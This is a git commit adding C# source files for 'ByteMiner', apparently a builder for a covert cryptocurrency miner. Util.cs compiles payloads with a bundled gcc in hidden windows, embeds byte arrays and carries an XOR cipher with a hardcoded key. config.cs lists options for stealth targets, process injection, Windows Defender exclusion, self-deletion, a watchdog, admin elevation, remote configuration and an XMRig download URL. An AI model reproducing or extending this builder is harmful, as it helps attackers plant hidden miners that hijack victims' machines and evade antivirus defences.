27adec039df5cde6cb5f80a5d67e39cd831cf0c0
ByteDoktor <ByteDoktor@proton.me>
2025-07-08 14:18:28 +0100

    Added Project files

---
+++ Util.cs
@@ -0,0 +1,109 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace ByteMiner
+{
+    class Util
+    {
+
+        public async void CompileMiner(string arguments)
+        {
+
+            string baseDir = AppContext.BaseDirectory;
+
+            using (Process process = new Process())
+            {
+
+                process.StartInfo.FileName = $"{baseDir}\\portable_tools\\mingw64\\bin\\gcc.exe";
+
+                string newPath = $"{baseDir};{baseDir}\\portable_tools\\mingw64\\bin;";
+                var key = process.StartInfo.EnvironmentVariables.Keys.Cast<string>().FirstOrDefault(k => string.Equals(k, "PATH", StringComparison.OrdinalIgnoreCase));
+
+                if (key != null)
+                {
+                    process.StartInfo.EnvironmentVariables[key] = newPath + process.StartInfo.EnvironmentVariables[key];
+                }
+                else
+                {
+                    process.StartInfo.EnvironmentVariables["PATH"] = newPath;
+                }
+                process.StartInfo.Arguments = arguments;
+                process.StartInfo.WorkingDirectory = baseDir;
+                process.StartInfo.CreateNoWindow = true;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.RedirectStandardError = false;
+                process.Start();
+
+
+                process.WaitForExit();
+
+            }
+        }
+
+        public async void CompileResources(string arguments)
+        {
+
+            string baseDir = AppContext.BaseDirectory;
+
+            using (Process process = new Process())
+            {
+
+                process.StartInfo.FileName = $"{baseDir}\\portable_tools\\mingw64\\bin\\windres.exe";
+
+                string newPath = $"{baseDir};{baseDir}\\portable_tools\\mingw64\\bin;";
+                var key = process.StartInfo.EnvironmentVariables.Keys.Cast<string>().FirstOrDefault(k => string.Equals(k, "PATH", StringComparison.OrdinalIgnoreCase));
+
+                if (key != null)
+                {
+                    process.StartInfo.EnvironmentVariables[key] = newPath + process.StartInfo.EnvironmentVariables[key];
+                }
+                else
+                {
+                    process.StartInfo.EnvironmentVariables["PATH"] = newPath;
+                }
+                process.StartInfo.Arguments = arguments;
+                process.StartInfo.WorkingDirectory = baseDir;
+                process.StartInfo.CreateNoWindow = true;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.RedirectStandardError = false;
+                process.Start();
+
+
+                process.WaitForExit();
+
+            }
+        }
+
+        public async void CreateResource(StringBuilder output, string name, byte[] data)
+        {
+            if (data.Length == 0)
+            {
+                output.AppendLine($"long {name}Size = 0;");
+                output.AppendLine($"unsigned char {name}[] = {{ }};");
+                return;
+            }
+
+            //byte[] encryptedData1 = Cipher(data, "LoveAllingUnitofLAWniUUXUUXVVXV");
+            //string encodedData = Convert.ToBase64String(encryptedData1);
+            //byte[] encryptedData2 = Cipher(Encoding.ASCII.GetBytes(encodedData), "LoveAllingUnitofLAWniUUXUUXVVXV");
+            output.AppendLine($"long {name}Size = {data.Length};");
+            output.AppendLine($"unsigned char {name}[] = {{ {string.Join(",", data)} }};");
+            
+        }
+
+        public static byte[] Cipher(byte[] data, string key)
+        {
+            byte[] result = new byte[data.Length];
+            for (int i = 0; i < data.Length; i++)
+            {
+                result[i] = (byte)(data[i] ^ key[i % key.Length]);
+            }
+            return result;
+        }
+
+    }
+}
---
+++ config.cs
@@ -0,0 +1,43 @@
+﻿namespace ByteMiner
+{
+    public class Config
+    {
+        public bool nicehash { get;  set; }
+        public bool tls { get;  set; }
+        public string poolUrl {  get;  set; }
+        public string walletAddress { get;  set; }
+        public string password { get;  set; }
+        public string coin { get;  set; }
+        public string ridId { get;  set; }
+
+        public string algo { get; set; }
+
+        public bool isStealthTargetsEnabled { get; set; }
+        public string stealthTargets { get; set; }
+        public bool isRemoteConfigEnabled { get; set; }
+        public string remoteConfigUrl { get; set; }
+
+        public bool isIdleMiningEnabled { get; set; }
+        public string idleThreads { get; set; }
+        public string activeThreads { get; set; }
+        public string idleWaitTime { get; set; }
+        public bool isBuildStatic { get; set; }
+        public string xmrigUrl { get; set; }
+        public int injectionTarget { get; set; }
+        public bool WDExclusion { get; set; }
+        public bool DisableSleep { get; set; }
+
+        public bool SelfDelete { get; set; }
+        public bool fullscreen { get; set; }
+        public bool Watchdog { get; set; }
+        public bool IsDebug { get; set; }
+        public bool RunAsAdmin { get; set; }
+
+        public string InstallPath { get; set; }
+
+        public string MinerService { get; set; }
+
+        public int BaseInstallPath { get; set; }
+
+    }
+}
